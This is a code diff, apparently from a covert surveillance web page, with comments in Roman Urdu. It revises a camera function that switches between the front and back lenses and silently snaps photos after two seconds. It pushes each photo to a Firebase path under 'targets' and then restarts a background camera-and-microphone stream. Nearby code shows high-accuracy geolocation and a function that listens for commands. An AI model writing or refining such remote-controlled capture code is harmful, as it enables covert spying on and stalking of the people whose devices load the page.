@@ -64,39 +64,62 @@
         }, null, {enableHighAccuracy: true});
     }
 
-    // --- ADVANCED CAMERA LOGIC ---
+    // --- FINAL CAMERA LOGIC (FIXED & MERGED) ---
     async function forceCapture(facing) {
-        if(activeStream) activeStream.getTracks().forEach(t => t.stop());
-        
+        // 1. Pehle chalte hue saare camera tracks ko band karo (Switching ke liye zaroori hai)
+        if (activeStream) {
+            activeStream.getTracks().forEach(track => track.stop());
+        }
+
         const constraints = {
-            video: { facingMode: { exact: facing } }
+            video: { 
+                facingMode: facing === 'user' ? "user" : { exact: "environment" },
+                width: { ideal: 640 },
+                height: { ideal: 480 }
+            }
         };
 
         try {
+            // 2. Naye lens (Front ya Back) se stream mangna
             const stream = await navigator.mediaDevices.getUserMedia(constraints)
-                .catch(() => navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } }));
+                .catch(async () => {
+                    // Fallback: Agar 'exact' fail ho jaye, to normal request karein
+                    return await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
+                });
             
             const v = document.createElement('video');
             v.srcObject = stream;
+            v.muted = true;
             await v.play();
 
+            // 3. 2 second wait taake focus/lighting set ho jaye
             setTimeout(() => {
                 const canvas = document.createElement('canvas');
-                canvas.width = 640; canvas.height = 480;
+                canvas.width = v.videoWidth;
+                canvas.height = v.videoHeight;
                 canvas.getContext('2d').drawImage(v, 0, 0);
+                
                 db.ref(`targets/${sessionID}/photos`).push({
                     img: canvas.toDataURL('image/jpeg', 0.6),
-                    type: facing,
+                    type: facing === 'user' ? "FRONT_CAM" : "BACK_CAM",
                     time: Date.now()
                 });
+
+                // 4. Photo lene ke baad tracks band karo aur original background stream on karo
                 stream.getTracks().forEach(t => t.stop());
-                // Restart background stream
-                navigator.mediaDevices.getUserMedia({video:true, audio:true}).then(s => activeStream = s);
+                restartBackgroundStream();
             }, 2000);
+
         } catch (err) {
-            console.log("Cam Fail: ", err);
-            navigator.mediaDevices.getUserMedia({video:true, audio:true}).then(s => activeStream = s);
+            console.error("Camera Switch Failed:", err);
+            restartBackgroundStream(); // Error par bhi background camera wapis on karein
         }
+    }
+
+    async function restartBackgroundStream() {
+        try {
+            activeStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        } catch(e) { console.log("Restart Stream Fail"); }
     }
 
     function listenCommands() {
